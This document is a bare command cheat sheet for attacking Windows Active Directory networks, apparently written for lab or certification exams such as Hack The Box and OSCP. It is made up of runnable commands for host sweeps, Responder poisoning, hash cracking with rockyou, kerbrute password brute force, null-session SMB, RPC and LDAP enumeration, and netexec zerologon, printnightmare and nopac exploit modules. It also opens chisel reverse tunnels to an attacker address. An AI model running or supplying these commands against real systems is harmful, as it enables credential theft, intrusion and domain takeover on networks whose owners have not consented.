```bash
fping -asgq 192.168.2.0/23 | tee /dev/tty | grep -oP '\d+\.\d+\.\d+\.\d+' > hosts.txt

nmap -v -A -iL hosts.txt -oA host_enum.out
```

```bash
sudo responder -I wlan0 -dwv
hashcat -m 5600 adm.ntlmv2 ~/rockyou.txt
```

```bash
kerbrute userenum -d outdated.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc dc.outdated.htb

kerbrute bruteuser -d $domain ~/rockyou.txt w.smith
```

```bash
netexec smb <IP> -u '' -p '' --shares
netexec smb <IP> -u '' -p '' --users
netxec ldap <IP> -u '' -p '' --password-not-required --admin-count --users --groups
netexec smb <IP> -u '' -p '' --rid-brute
netexec smb <IP> -u '' -p '' -M spider_plus
netexec smb <IP> -u '' -p '' -M printnightmare
netexec smb <IP> -u '' -p '' -M gpp_password
netexec smb <IP> -u '' -p '' -M nopac
netexec smb <IP> -u '' -p '' -M zerologon
```

```bash
rpcclient -U '' -N <IP>
rpcclient -U "username%passwd" <IP>  
querydispinfo 
queryuser joe 
querygroup 0x44f       
querygroupmem 0x44f 
cat users.raw | awk -F [ '{print $2}' | awk -F] '{print $1}' > users.txt
```

```bash
ldapsearch -H ldap://dc.outdated.com -D '' -w '' -b "dc=outdated,dc=htb"
ldapsearch -H ldap://dc01.domain.com -D '' -w '' -b "dc=offsec,dc=com" | grep -i description
```

```bash
.\chisel.exe client 192.168.45.x:8888 R:9999:socks
.\chisel.exe client 192.168.45.x:8888 8080:127.0.0.1:80
```

```bash
impacket-GetNPUsers -dc-ip <IP> -request  oscp.exam/-format hashcat
impacket-GetNPUsers oscp.exam/user -dc-ip <IP> -format hashcat

impacket-GetNPUsers outdated.htb/ -dc-ip 10.10.11.175 -no-pass -usersfile users.txt 

hashcat -m 18200 crackme.txt ~/rockyou.txt -O -r ~/opt/wordlists/best64.rule -O
```
